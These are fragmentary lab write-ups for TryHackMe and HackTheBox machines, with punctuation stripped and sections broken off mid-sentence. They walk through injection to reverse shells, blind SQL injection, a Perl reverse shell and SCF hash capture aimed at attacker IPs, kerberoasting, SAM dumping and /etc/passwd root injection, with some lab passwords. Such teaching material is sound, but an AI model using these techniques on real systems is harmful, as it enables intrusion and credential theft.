appending  ort  to it  Finally  I could try executing it with the exec function reports PythonPlayground image8 png Unfortunately  the exec function is blacklisted as well  However  if you have read my  Develpy Writeup  https   www google com

to try reports PythonPlayground image13 png Using the   import   keyword  we can circumvent the blacklist reports PythonPlayground image1 png Awesome  We re root  But there s a catch reports PythonPlayground image14 png Looks like we are in a docker container     Well  let s just get the first flag reports PythonPlayground image21 png We can also ssh into the box using the credentials for Connor that we saw earlier reports PythonPlayground image24 png ROOT PRIVESCSo we have a reverse shell inside a docker container and we are in the actual box through an ssh session  but how are we going to get root  I ran the  linPEAS  https   www google com url q https   github com carlospolop privilege escalation awesome scripts suite tree master linPEAS sa D source editors ust 1653953672147938 usg AOvVaw3oP6L3vG7KcGjXT1fkgu0Z  privilege escalation enumeration script on the ssh session  but it did not find anything out of the ordinary  This part of rooting the box is really cool and is when we piece together our shells  Let s run linPEAS on the reverse shell and see if we can find anyway to escape it and get root reports PythonPlayground image17 png Above we can see that the log directory is mounted on the docker container  Using this mount  we can interact directly with the host system  It s important to note that due to us being root in the docker container  we can make files on  var log as root  We can create a setuid binary by compiling the following code and giving it setuid permissions reports PythonPlayground image19 png Unfortunately  there is no way to download this using wget or curl as it is not on the docker container  However  in the theme of this box  we can download files using python with the urllib request module reports PythonPlayground image4 png  reports PythonPlayground image9 png  reports PythonPlayground image3 png And we are rootBONUS reports PythonPlayground image7 png Here we can see all the blacklisted strings  Note how the script checks for  import   rather than  import   This seemingly unimportant space makes the difference between allowing   import   and not  Changing this makes the program invulnerable  as far as I

report form instead because it is better formatted reports Develpy image8 png  reports Develpy image28 png This was a nice little challenge created by  stuxnet  This box had quite a unique foothold  in the sense that it was made purely for challenging your knowledge about the security of python scripting  A lot of programmers do not think about security when they make their programs  rather they think about just getting their program to perform a desired function  A large part about cybersecurity is about finding bugs in programs and exploiting them to make them do functions that they were not designed to do  Let s jump right in  and I will go into detail about security related to python scriptingReconnaissanceAs usual  I will start with an nmap scan reports Develpy image19 png We see there are two ports open  port 22  ssh  and port 10000  snet sensor mgmt    As can be seen from the output  nmap is not sure what service is running on port 10000  but apparently it is getting some HTTP output  Let s visit the webpage and see what we get reports Develpy image26 png Getting UserWe get a strange response that looks like an error in some python script  It is especially interesting that the name  GET  is not defined  This looks a lot like a result of a GET request   Let s fire up burpsuite and verify this  Refreshing the page and intercepting our request we see the following reports Develpy image2 png This is a very standard GET request  In the output we see reports Develpy image10 png So it looks like this script is looking at our request method and inputting it into the script  The program most likely expects an integer as the input  so let s modify our request so that we can see how the script is designed to behave reports Develpy image22 png And we see the following response reports Develpy image11 png Up to this point with the information that we have gathered about how this script works  it is likely that the script is performing some kind of evaluation on our input  One more thing I checked before I tried to input malicious code is to confirm that the script evaluates what we send  In our previous request  instead of inputting the number 4  let s input 0 reports Develpy image25 png Now we don t see the strings beginning with  Exploiting tryhackme   So let s change 0 to 0 1 to see if the python script is evaluating the math reports Develpy image18 png Notice how now there is one string beginning with  Exploiting tryhackme   This indicates that the script calculated 0 1  So we have confirmed that the script is using some kind of evaluating function  Let s input some malicious python code so that we can get a reverse shell  We can import the os module to execute system commands reports Develpy image16 png  reports Develpy image5 png Looks like we can execute commands as the user king  So let s get a reverse shell reports Develpy image12 png  reports Develpy image14 png  reports Develpy image9 png Privilege Escalation to RootCool  We got a shell  Let s see what is in king s directory reports Develpy image3 png We see some interesting files  but the root sh file especially stands out  It is one of the only files in king s directory that is owned by root  Looking at the contents of the bash script  we see that it only has one line reports Develpy image20 png First of all  this looks like a strange thing to have in a bash script  Why not just type that command in the first place  It seems likely that there is some cronjob running this script  Second of all  python is being run without specifying it s full path  If there is indeed a cronjob  then it should only be running commands that are specified within a full path  Unfortunately however  we do not have write access to the python binary  and it is likely that root s path is set to its default  So  it looks like we probably can t do some sort of path privilege escalation  In  etc crontab we see the following reports Develpy image27 png Tthere are definitely cron jobs running on this system  At this point I downloaded  pspy  https   www google com url q https   github com DominicBreuker pspy sa D source editors ust 1653961217842478 usg AOvVaw3Xy4wBS6ssPN4XQD4bXbER  and saw the following interesting output when I ran it reports Develpy image23 png It looks like there might be some service running on port 8080 that is only open to localhost  Running netstat  we can confirm this reports Develpy image15 png We can forward this port using socat so that it would be remotely accessible  reports Develpy image24 png  reports Develpy image13 png We see this is a web server that has an upload feature reports Develpy image6 png Let s just touch a file with the extension  py and see what happens reports Develpy image1 png The file was uploaded to a directory called  media  Remember the root sh script which ran any file within the  media directory  We can confirm that the server ran this script by looking at pspy reports Develpy

1653961217844668 usg AOvVaw3T0s2eu ixwvfoqmeVXd6   and put it in our script reports Develpy image17 png After uploading  we wait a bit for the cronjob to run again  and eventually we will get a hit back reports Develpy image4 png BonusThat was a lot of fun  but let s see how and why we were able to get a foothold on this box  We ll start by inspecting the script that was related to the error on the webpage reports Develpy image21 png The old version of python  python2  has a dangerous function called input which evaluates the input of a user  This is a security risk within the function  and it is strongly discouraged from being used  Instead  python encourages the use of raw  input which treats the user s input as a string regardless of how the user formats it  this is in contrast to the input function which does not modify the type of the input   Modifying the script to use raw  input instead of input successfully patches the python injection vulnerability  Note that python3 has since modified the input function to behave like raw  input so as to patch this vulnerabilityThank you to  stuxnet for such a fun challenge  I hope you learned a bit from my red team analysis of the box and hopefully a bit of the blue team as well",

this box is that gobuster would not work due to a DoS protection against 404 http errors  So how would we find the potentially vulnerable web pages of the web serverReconnaissanceThe first thing that I always do when targeting a box is adding its ip to my  etc hosts file  because it is easier to remember a hostname than an ip reports Writeup image38 png Let s start with enumerating the ports of the box nmap  sC  sV  oA nmap nmap writeup htb reports Writeup image24 png Looks like there are only two ports running on this box  Because this was a small amount  I ran an nmap scan to enumerate all ports with the  p  flag  but I did not discover any other ports  Looking at the result of the nmap scan  the box is running the Debian Linux distribution  noting information like this is important when trying to understand the makeup of a box   Software can differ depending on the operating system   distribution of a system  Nmap discovered a directory  writeup  from the robots txt file  Let s look at the webpage on http   writeup htbWeb Enumeration reports Writeup image8 png First time I saw this webpage  I foolishly did a gobuster because I did not read the message in red  As a result  I got banned and had to wait a couple of minutes for my ip to no longer be blacklisted  Looking at the message  we can see that there is a DoS script in place to look for 40x errors  this unfortunately includes 404 errors which we need for gobuster to work   Another potentially important thing to note is the email jkr writeup htb  This means that there might be a user jkr on the box  which may or may not come handy   It s a good habit to note down any potentially important information in a notes txt fileIncidentally  because I added the ip to my  etc hosts file and navigated to the http   writeup htb page  it is important to check also http   10 10 10 138 to make sure there is no virtual host routing in place  for this box it turns out that there is no vhost routing   Let s see what is on the  writeup directory reports Writeup image6 png Visiting the writeup writeup  we get the following reports Writeup image5 png There is nothing interesting in this page  or in any of the other

inclusion   Trying http   writeup htb writeup index phyp page                                     etc passwd  we get the following output reports Writeup image31 png I tried a couple of other methods

bottom of the  writeup directory       reports Writeup image15 pngThis was hinting at the fact that this page was created with a web content management system  CMS   We can confirm that by viewing the

version of the CMS reports Writeup image19 png The CHANGELOG txt file seems like it would have the version of the CMS  Let s visit the  writeup doc CHANGELOG txt path on the web server reports Writeup image12 png So we see that this web page is running CMS Made Simple version 2 2 9 1  Looking up CMS Made Simple on searchsploit  we are flooded with exploits reports Writeup image21 png There is only one exploit here that looks promising  the SQL Injection exploit for versions   2 2 10  All other exploits either require credentials or are too old  Let s mirror this exploit and examine it  The key parts of this exploit is the vulnerable page and payload reports Writeup image7 png  reports Writeup image28 png  reports Writeup image30 png There is a parameter in the News module called m1 idlist that is vulnerable to SQL injection  As we can see from the payload  this script uses a blind SQL injection attack to extract credentials from the affected system  The attack works by asking the server to sleep for a certain period of time if a certain statement is true  So if we find that a request of ours makes the web server take an unusual amount of time to respond to us  then we know that the statement ran true  This means that we could ask the server the followingPentester   Hey web server  You should sleep for 1 second if you have a username in the cms users table that starts with the letter aWeb server   Hi Pentester  I don t have a user in my cms users table that starts with the letter a  so I am not going to sleep for 1 secondPentester   No problem  You should sleep for 1 second if you have a username in the cms users table that starts with the letter bWeb server   I actually have a user in my cms users table that starts with the letter b  so I will sleep for 1 secondPentester   Okay  so it normally takes the web server to respond to me after 1 second  but now it took the web server two seconds to respond  There is probably a user in the cms users table that starts with the letter b  Let s ask the web server another question   Hey web server  it s me again  You should sleep for 1 second if you have a username in the cms users table that starts with the letters baI think you get the point  Running the exploit with python 46635 py  u http   writeup htb writeup we get the hashed credentials of the user jkr reports Writeup image42 png Now all we have to do is crack the hash  Because we have the salt of the hash  we can crack the hash a lot more easily  The hashed password is 32 characters long which suggests that it is an md5 hash  We can use hashcat to crack the password  but this handy exploit even has a cracking function  albeit it is not as fast as hashcatScript Method reports Writeup image17 png  reports Writeup image26 png Hashcat Method

We can conclude that the password is a salted md5sum  Viewing hashcat s example hashes  we can see the mode that corresponds most to what we are looking for reports Writeup image1 png As you can see  mode 20 looks like the right hash so let s crack it  Make sure to first put the hash in the format hash salt as described by the  Hashcat   Example Hashes  https   www google com url q https   hashcat

image34 png Incidentally  the purpose of salts is so that multiple hashes in a compromised credential database do not get cracked simultaneously  It is highly likely that in a database of over a million users  many users have the same password  This would mean that two users with the password of 0xd4y would both get cracked easily by use of a  rainbow table  https   www google com url q https

as grep are actually just binaries that are stored in some directory on your machine  typically it is stored in  bin reports Writeup image3 png The point of PATHs is so that you don t have to constantly type  bin grep whenever you want to run that command  it s just tedious   An important thing to note is the order of what s in the  PATH variable  By default   usr local bin comes before  bin  This means that if we made a file and put it in  usr local bin  then when we run grep  we are actually running  usr local bin grep and not  bin grepProof of Concept reports Writeup image11 png  reports Writeup image13 png    after logging out and logging back in reports Writeup image22 png Note that the user who created a binary in the  usr local bin path must logout and log back in for it to affect him  All other users on the box do not need to do that  I am not sure why   This means that in a real scenario  before the command is hijacked  a victim could run a command and it would work just as expected  After it gets hijacked  the victim could run that same command  during the same login session  and the hijacked binary would get executed instead  This is why for the sake of security  it is imperative that high privileged users execute the full path of commands  especially when it comes to cron jobs   Let s look for cron jobs running as root  There might be one that is running a command without using its full path  There is a great script on github called  pspy  https   www google com url q https   github com DominicBreuker pspy sa D source editors ust 1653884891185100 usg AOvVaw2w7  BCyKSKMsXly3u3ToU  that actively monitors all processes running on a system  Downloading pspy and running it on the box  we see the following output reports Writeup image10 png When first doing this box  I noticed that whenever I put a binary in the  usr local bin path or the  usr local sbin path  it would keep getting removed after some time  This cronjob is probably the culprit  I went into this rabbit hole for a long time  I tried using symbolic links to delete files  but it did not work  This privesc was especially difficult for people hacking on private instances  such as myself  because watch what happens when a person logs into jkr reports Writeup image39 png Suddenly  we are met with a whole bunch of commands that don t use the full path  We have sh  run parts  and uname  Each of these commands is run by UID 0 which is root  So if we put a reverse shell in one of these binaries and copy it to the  usr local bin path  it will get executed and we will have a shell  The bash reverse shell did not work for me  so I used the perl reverse shellperl  e  use Socket  i  10 10 14 5   p 9001 socket S PF INET SOCK STREAM getprotobyname

way  as well as having strong passwords that are hard to crack  Something that really makes this box stand out is not so much the vulnerabilities themselves  but rather the reason why they are easily exploitable in the first place  Microsoft essentially made themselves vulnerable  as they spoke a little bit too much on THEIR OWN website  Come check out the writeup to see what I mean date    2021

report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Active image4 png  reports Active image8 png Just like Bastion  this was another realistic Windows box  However  instead of it being centered around Bastion hosts  this box was about the Windows Active Directory service  This machine was vulnerable due to the use of Group Policy Preferences  GPP  for managing passwords  The passwords stored in the Groups xml file are AES 256 encrypted with a static key  but the encryption key is publicly available on Microsoft s site  After getting the credentials of a low privileged user  we find that we can get the hash of the Administrator by abusing the way kerberos authenticates its users  this abuse is called kerberoastingRECONAs usual  I will add the ip of the box to my  etc hosts file and call it active htb  Let s enumerate the ports of the machine so we can find some attack vectorsnmap  sC  sV  oA nmap nmap active htb reports Active image12 png Immediately  we can see that this is a Windows box running the Active Directory  AD  service  This can be denoted due to the fact that ports 53  DNS   88  Kerberos   139   445  SMB   and 389  636  3268  3269  LDAP  are open  The first thing that comes to mind is to enumerate the SMB protocol on port 445smbmap  H active htb reports Active image7 png So we have READ permissions to the Replication directory  Let s check all the files inside this directory with the   R flagsmbmap  H active htb  R Replication reports Active image9 png  reports Active image17 png At this point I was stuck for a while  As it turns out  there is something wrong with the smbmap tool on my machine  Even after updating smbmap  for some reason the recursive search does not show all the files in the Replication directory  Every pentester should know the extent of their tools  as well as the reliability of each tool  Some tools can be more reliable  or stealthier  or faster  whatever it is that you are looking for   It is important to understand the difference in each tool  and to know which one to use depending on what you need  I found out that mounting the share proved to be the most reliable  and convenient    check out the  Bastion writeup  https   www google com url q https   0xd4y github io Writeups HackTheBox Bastion 2520Writeup pdf sa D source

Active image16 pngAnd another strange problem  I was never able to fix this error  and I still have no idea why I keep getting it  Even tweaking the version number to match the SMB server didn t work  I think it is because the Guest account is disabled  but I didn t see how to anonymously access the SMB share otherwise  So now I went to plan C  which is just to recursively download everything on the Replication directory  obviously this is not ideal  as there could be a lot of useless and large filesRETRIEVING CREDENTIALS reports Active image15 png Looking through all of the files  we see the

the fact that it is only 32 bits is alarming as generally this is quite an insecure block size  Even worse  the encryption key is stated blatantly on Microsoft s documents   AES 256 key  https   www

Microsoft document is how the gpp decrypt tool works to decrypt the encrypted cpassword string reports Active image13 png Notice how the key used in this script to decrypt a string matches that of the key in the Microsoft documentSo  let s see the magic of this tool and run it against our string reports Active image10 png And we get the password as GPPstillStandingStrong2k18  The first thing I did was to login to enumerate the SMB share with the credentials SVC  TGS GPPstillStandingStrong2k18 reports Active image19 png Although the SVC  TGS user has access to more files than Guest  there were no interesting files to retrieve  I tried to find a way to get a shell on the box  but the SVC  TGS user was too low privileged  At this point I sat back for a while and took a deeper look at the results of the nmap scanPRIVILEGE ESCALATIONRemember port 88  kerberos  from the nmap scan   Kerberos is all about authenticating a user over an untrusted network  And anyways  what in the world is a name like SVC  TGS  That username certainly doesn t sound as cool as 0xd4y  As it turns out  TGS stands for Ticket Granting Server  and I m not sure what SVC is but I think it is the abbreviation for service   The TGS is part of the KDC  Key Distribution Center  and exists to validate the use of a ticket for a specific purpose  What we want to do is to scan the active directory for the Administrator s SPN  Service Principal Name  value and then request the service tickets from the Active Directory which we will crack offline  The essential part of this attack is that the service tickets are hashed using the password of the user  in this case the Administrator as this is the account we are targeting   I highly encourage you to read the article  Ticket Granting Service   an overview  https   www google com url q https   www sciencedirect com topics computer science ticket granting service sa D source editors ust 1653954214358739 usg AOvVaw2DWhx4i9AXLp3lbICjayy2  as it really helps in understanding how Kerberos works  Let s use the GetUserSPNs py impacket script to extract Administrator s hash reports Active image3 png Unfortunately  when we run this script we are met with an error related to clock skew between the client  us  and the server  active htb   This is due to a security feature by Microsoft to try to mitigate replay attacks  A replay attack is when an attacker intercepts a communication  and then modifies the request to make the receiver of the communication perform a malicious task  Kerberos uses time stamps to see if the time between the request of the user and the time of the server matches within a certain margin of time  In the case that the clock skew does not fall within the acceptable range  then it is possible that the sender of the communication modified the request to perhaps make the receiver perform something malicious for his own benefit  As written by Microsoft s document on clock skew  Kerberos Clock Synchronization

1653954214359722 usg AOvVaw30mRtT10rJxBsp0OqJ0AMx   the default acceptable range is 5 minutes and our skew is a little over 9 minutes reports Active image1 png      reports Active image21 png Let s change the date on our host machine to match that of the server and then test the clock skew reports Active image20 png Now when I run the same nmap command reports Active image14 png The reason why the clock skew is 4 minutes and not something like a couple of seconds is because it took my nmap scan a while to completeThe GetUserSPNs py impacket script should work now  as we found out that the default acceptable clock skew range is within 5 minutes  Running the command again  we now get a different output reports Active image11 png As we can see  we get the Kerberos 5 TGS REP hash for Administrator  We can use the hashcat   example hashes command to find the mode required to crack this hash reports Active image6 png So we found out that the mode is 13100  We can now crack the hash with hashcat  m 13100 hash rockyou txt  As I recommended in previous writeups  it is highly encouraged to crack hashes on your host machine because it is much quicker than doing it on a VM  Eventually  the hash will be cracked revealing that the password to the Administrator account is Ticketmaster1968  Now we can get a SYSTEM shell on the box with yet another impacket python script  psexec py  have I mentioned how cool impacket is    Using this script did not work for the SVC  TGS user  because we did not have write access to the ADMIN  directory  Now as the Administrator  we have write access to ADMIN  which will let us create a named pipe to the PSExec service  which will allow us to directly send commands as NT AUTHORITY  SYSTEM  the highest privileged Windows user  You can read

reports Bastion image12 png  reports Bastion image21 png This was an amazing box that really showed the importance of using google  It was unique in that it did not have a web server port  The great thing about this box is that it was very realistic  as intended by the author L4mpje  Let s get right into itAs usual  I added the ip to my  etc hosts file and called it bastion htb  Afterwards  I ran the normal nmap  sC  sV  oA nmap nmap bastion htb which revealed many ports  Just to be sure that I had all the ports  I ran nmap  p    max retries 0 bastion htb  Note the max retries flag which  when set to 0  performs the scan at it s quickest but most unreliable speed  This is because the max retries flag is used to specify the maximum port scan probe retransmissions  and the less transmissions you send  the higher likelihood that you will have false negatives and positives  After scanning all ports  the following ports were revealed  47001 49664 49665 49666 49667 49668 49669 49670  Due to this  I ran the thorough nmap scan once again  this time specifying the ports   nmap  sC  sV  oA nmap nmap  p 22 135 139 445 5985 47001 49664 49665 49666 49667 49668 49669 49670 bastion htb reports Bastion image4 png Looks like the high ports that the nmap  p  command found were of no importance  Looking at the results however  two ports in particular stand out  This Windows box is running ssh   That s certainly strange as I have not seen any other Windows box with ssh  more on this later   The other port that stands out is port 445  Samba a k a SMB which stands for Server Message Block   and it is configured to allow guest access  This seems like the most obvious attack vector  so let s see what we findsmbmap  H bastion htb  u guest reports Bastion image3 png Again  two things in this output stand out  First of all  there is a Backups directory which we have READ and WRITE access to  The fact that we have WRITE access to this is a huge red flag  This means that we could drop a malicious SCF  shell command file  to potentially steal hashes from users who access this file  We can write a  scf file with the following contentsShellCommand 2IconFile     10 13 37 2  share  0xd4y icoTaskbarCommand ToggleDesktopWhenever a user browses to this file  Windows will attempt to authenticate to our share with the credentials of the user  meaning that we can capture these credentials  albeit the password is hashed   The fact that we have write access to a directory containing backups is especially alarming  as which users would normally access such a directory  Probably domain admins  There is an excellent article on this topic that I highly recommend you read   https   pentestlab blog 2017 12 13 smb share scf file attacks   https   www google com url q https   pentestlab

easy box and there are no real users on the system to execute the  scf file  as this is just a box rather than a real attackThe other thing that stands out is this smbmap message   Work      Unable to remove test directory at     bastion htb  Backups  GZHGUJOWDT  please remove manuallyThe smbmap tool knows that we have write access to   Backups because it was able to write to it  However  the fact that it was not able to remove it shows that this created directory could be a way for defenders to find out that someone may be up to something malicious  In a real penetration testing environment  it may be more wise to use smbclient  L  U guest bastion htb which lists the shares  but does not list the permissions reports Bastion image17 png Ok  enough stalling  Let s just see what s inside this   Backups directory  I created a  smb directory on my machine  so that if I download a file it goes straight to the  smb directory  and connected to the SMB sharesmbclient  U guest   bastion htb Backups reports Bastion image6 png I downloaded the note txt file using get note txt and viewed it on my host machine reports Bastion image20 png This file is a hint that there is probably a large backup file somewhere in this SMB share  Let s keep enumerating  Eventually you ll find the following directory reports Bastion image14 png Incidentally  we know that there is probably a user named L4mpje on the system  it is always important to save information like this in a file where you keep your notes   Two files here stand out  first there were two ports that stood out  then two interesting things with the SMB share  now this   why are there always two things that stand out     The  vhd  virtual hard disk  files are quite conspicuous  these files are absolutely massive  One is about 37MB while the other one is 5 4GB and are no doubt the backup files that the note txt message was referring to  I foolishly downloaded both files and inspected them when I was first going through this machine  so let s see how to view these files without waiting a million years for them to finish installingThe mount command does the trick  Running the command sudo mount  t cifs   bastion htb Backups smb   o username guest we see the full listing of the directory Backups  The   t option for mount specifies the type of file share we want to mount  CIFS stands for Common Internet File System and is a dialect  or particular implementation  of the SMB protocol reports Bastion image10 png Note the strange directory names that smbmap created  Anyways  let s get right to the  vhd files reports Bastion image15 png When I was first going through this box  I mounted both the  vhd files  but the 37MB one is not interesting as it just has boot files  Let s mount the  vhd file and inspect its contentsguestmount  a 9b9cfbc4 369e 11e9 a17c 806e6f6e6963 vhd  m  dev sda1   ro   business hackthebox easy windows bastion mnt reports Bastion image2 png And we get a whole listing of files  At this point  I looked through a ton of data  but I couldn t find anything interesting laying around  However  there is still a way to extract credentials due to a huge oversight of the sysadmins  They accidentally backed up the files SYSTEM and SAM  Security Account Manager  located in  Windows System32 config reports Bastion image16 png So the note really wasn t kidding when it said to not transfer the entire backup file locally  A lazy sysadmin did not realize that he backed up even the SAM and SYSTEM file  THESE FILES ARE HIGHLY SENSITIVE    The SAM file is a database file that stores credentials of the local users  These credentials are hashed and encrypted by the system boot key which is located in SYSTEM  This means that if you have access to the SYSTEM file  then you can decrypt the credentials revealing their hashesWe can use the impacket secretsdump tool to extract hashed credentials  Let s copy these files to our root directory   bastion  and continue with the commandimpacket secretsdump  sam SAM  system SYSTEM local reports Bastion image11 png Well  now we have the hash for the L4mpje user  Notice how Administrator and Guest have blank LM and NTLM hashes  This indicates that Administrator and Guest were most likely disabled when this file was backed up  even more evidence that this was probably backed up with the SYSTEM user   but this could be an old backup file and Administrator could have been activated since then  Anyways  let s copy the NTLM hash of L4mpje and crack ithashcat  m 1000 26112010952d963c8dc4217daec986d9  usr share wordlists rockyou txtAfter about a minute  the NTLM hash is cracked revealing that L4mpje s password is bureaulampjeTipUsing Hashcat on a virtual machine is not recommended  Hashcat runs a lot quicker on   your host machineLet s ssh into the box and hope that L4mpje has not updated his password since the  vhd file was backed up reports Bastion image5 png It was expected that L4mpje did not change his password  Not because this is meant to be a vulnerable machine  but this is completely realistic  How often does a person change his passwordWe can now grab user txt  but how are we going to escalate to administrator  This is where having knowledge on the basic file system of Windows is useful  After a lot of enumeration  you will notice that there is a particular directory on this box which stands out on C   Program Files  x86 reports Bastion image9 png The mRemoteNG directory is not part of the default Windows build  Let s inspect it further reports Bastion image7 png Nothing in this directory looks out of the ordinary  In any case  we should look into this for multiple reasons1   mRemoteNG is a tool for connecting and managing remote systems  protocols such as SSH  RDP  etc  are used2   mRemoteNG is not part of the default Windows build 3   This box is called Bastion  hinting at the possibility that this box is a bastion host  A bastion host allows external connections to a private network  Due to the increased probability of an attack on a bastion host  it must be hardened to withstand such attacks  As such  typically there are very few services running on a bastion host  in our case the bastion host is running SSH and an SMB share   Ideally  a bastion host acts as a jump server once a connection has been established to it  a jump server is used to access devices in a separate security zone   Essentially  this means after connecting to a bastion host  authorized users can have access to private instances located within the virtual private cloud  VPC  Think of a bastion host as a bastion is in real life  hence the name   You can walk up to the bastion  knock on the castle walls  but you are not allowed inside unless you are authorized  If you attack the bastion  you may be met with defensive fireBLACKLISTED reports Bastion image1 png After a bit of googling  you will find a great article explaining the insecurity of mRemoteNG   https

password seems to simply just be base64 encoded  but when we decode it  we just get garbage reports Bastion image18 png This suggests that the password is most likely encrypted  Luckily  there are many different ways to decrypt mRemoteNG passwords  I used this tool on github   https   github com kmahyyg mremoteng decrypt  https   www google com url q https   github com kmahyyg mremoteng decrypt

now ssh into Administrator and get root txt reports Bastion image19 png There were many things learned in this box  I really appreciate the work L4mpje did on creating this challenge  It was completely realistic  and I loved it beginning to end  Thanks also to you for reading my writeup  and I hope you learned from this box as much as I did",

machine  and the intended solution  There is a lot to learn here about web security and networking  and I highly encourage you to read this writeup date    2021 02 21 image     images 0xd4y logo gray png tags     Open Redirect  RCEThis report can be read both on this site  and as its  a href    https   0xd4y github io reports Writer 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Bank image5 png  reports Bank image3 png Never underestimate the power of BurpSuite  In this box  I will go through the unintended and intended solution  There is a lot to learn in the unintended solution  and this is actually how I went about rooting the box  After I show you the unintended solution  I will demonstrate how the author of the box   makelarisjr  intended to go about rooting the machineAs always  we will enumerate the ports with nmap  sC  sV oA nmap nmap 10 10 10 29 reports Bank image7 png Immediately  something unusual strikes us  Port 53  the port for DNS  is running on the TCP protocol  Typically  this runs on UDP  because UDP is faster and DNS does not need to handle large requests  The only reason why this port would be run on TCP is perhaps for zone transferring reports Bank image26 png Now as a habit  before I go onto trying to get root  I like to add the ip of the box to my  etc hosts file  That way  I don t have to memorize the ip of the machine reports Bank image18 png Before we go to the web server  let s enumerate the subdomains with the dig command reports Bank image12 png The AXFR protocol is typically used in conjunction with TCP  Cool  Let s add the subdomains to our  etc hosts file reports Bank image33 png Unfortunately  all of these subdomains  except for bank htb  seem to be a rabbit hole  When I visited chris bank htb  ns bank htb  and www bank htb  I was met with the following default ubuntu page reports Bank image30 png This same page appeared when I went to 10 10 10 29  Running a gobuster scan on all of these pages didn t reveal anything interesting  However  bank htb presented me with this login page reports Bank image10 png I tried to see if this login page was vulnerable to SQL injection  but I couldn t find any vulnerabilities  After enumerating the directories with gobuster  I found the following reports Bank image28 png The 302 status code is a redirection  This is why when I visited  support php  I was redirected to  login php  However  let s see if this redirection was configured properly  A quick test for this is to curl the directory and pipe it to wc  ccurl http   bank htb support php wc  cWe see that the response returns 3861 characters  This is very odd  as typically redirect pages don t contain more than a couple hundred characters  Let s see what happens if we look at this through burp  Make sure to intercept server responses in the  Options  tab under  Proxy reports Bank image1 png Let s intercept our request when going on http   bank htb support php reports Bank image4 png After forwarding this request  we intercept the server response which is quite long with html tags  indicating that it is displaying a webpage reports Bank image31 png As expected  we get a 302 Found response  Note how we can view the source of  support php  As you can probably deduce  this is a vulnerability in itself  This means that we don t need to authenticate in order to view this page  Changing 302 Found to 200 OK and forwarding this request  we can now interact with the support php page reports Bank image13 png Here you can try to upload an image file  php file  or whatever you d like  As it turns out  the webpage only allows image files  Eventually  you ll find that you cannot upload a reverse shell  due to file restrictions  without knowing a particular secret  That secret lies in a comment embedded in the source code  always check the source code reports Bank image16 png Uploading a php reverse shell with the extension of htb instead of php should do the trick  I used the reverse shell from pentestmonkey which you can find by visiting the following link   https   github com

user txt file in  home chris   Now let s get root txtThe first thing I always do when getting a reverse shell is sudo  l and groups  Nothing was out of the ordinary  so I went to do the next thing that I always do  I set up a python http server on my machine hosting linpeas sh  then on the reverse shell I went to the  tmp directory  downloaded the linpeas sh file  and ran it  you can find linpeas using the following link   https   github com carlospolop privilege escalation awesome scripts suite  https   www google com url q https   github com carlospolop privilege escalation awesome scripts suite sa D source editors ust 1653958332695769 usg AOvVaw1MOcd4iGwIozIAy 2spgF6    After running linpeas  the first thing I do is skim the output for anything that is highlighted in yellow with red text  this indicates a high chance of a privilege escalation vector   If linpeas doesn t find anything completely out of the ordinary  I look through the output more closely  For this box  there was no need to look any further as a critical vulnerability was found reports Bank image29 png We have write access to  etc passwd  If we create a user with id 0 in the  etc passwd file  then we will be root  The first thing to do is to create a unix crypt password  the password hash used for linux systems   and put this in the  etc passwd file corresponding to a user that we create reports Bank image25 png This is the  etc passwd file before editing reports Bank image32 png This is the  etc passwd file after editing reports Bank image34 png Now we can su to 0xd4y  the user that we created  with the password of password reports Bank image27 png Incidentally  I could have also just changed the root password by replacing the  x of the root entry with the password hash  This works because  etc passwd takes precedence over  etc shadow  Additionally  adding a new user with id 0 also works because Unix systems identify users by their id  not by their username  This was a very fun box and really highlighted the power of BurpSuite  However  as it turns out  this way of rooting the box was unintended  So let s go through the way that the author intendedIntended SolutionAs it turns out  when running a gobuster scan on  http   bank htb  https   www google com url q http   bank htb sa D source editors ust 1653958332697464 usg AOvVaw1HXJjloI3LGver3kWPOIXQ   there was a

on one of the files reveals the following reports Bank image8 png I tried base64 decoding these parameters  but it was just a nonsensical output due to the encryption  So  I recursively downloaded all the files in this directory with wget  r  http   bank htb balance transfer   https   www google com url q http   bank htb balance transfer  sa D source editors ust 1653958332698299 usg AOvVaw1es7j4P8cUpJhLx9QTm6AE  in order to inspect these files further on my machine  I assumed since this is a CTF  there is probably a file in this big mess that is different  I checked the Full Name parameter of each file to see if there was something different in one of the files using grep Name  rThis command lists the Full Name parameter in all the files in the directory  After doing this I noticed a pattern  Each encrypted full name is 128 characters in length  I isolated each full name by using the tr command reports Bank image9 png Now we have Full Name  the encrypted full name  and the file path on different lines  We are only interested in the encrypted name and the file path for now  so let s do a grep  v on  Full Name   So far our entire command looks like this  grep Name  r   tr        n  grep  v NameNow we have a bunch of strings that are 128 characters in length  so let s do a grep  v on any string that s more than 120 characters  I arbitrarily chose this number  you could have chosen whatever number suits you as long as it isn t too small and not more than 128   After grepping out the 128 character length strings  my terminal was now only flooded by the path of each file reports Bank image2 png Finally  let s do a grep  v on  acc  to get rid of the flooding of those file paths  After doing all of this we get the following output reports Bank image17 png Interesting  There must be a file somewhere in this directory with the full name of Chris Christopoulos  Let s grep for this specific string in the directory to find the file containing this string reports Bank image6 png  reports Bank image23 png These aren t the ssh credentials for chris  so let s use these credentials on  login php reports Bank image20 png  We are greeted with a nice dashboard and an interesting balance  There is nothing out of the ordinary to be seen here  The real vulnerability lies in the support php directory  so let s visit that reports Bank image15 png Well  that looks a lot nicer than what we saw in Burp  I will skip the methodology of getting the reverse shell  as I already covered this in the unintended solution aboveA very common way to escalate privileges is by abusing setuid binaries  This can be viewed using the find    perm  4000 2  dev null  command  Using this  we find the following binaries reports Bank image24 png One setuid binary in particular stands out   var htb bin emergency  Let s just run it and see what happens reports Bank image14 png  reports Bank image21 png BonusWhen I was first doing this box  I actually did not know

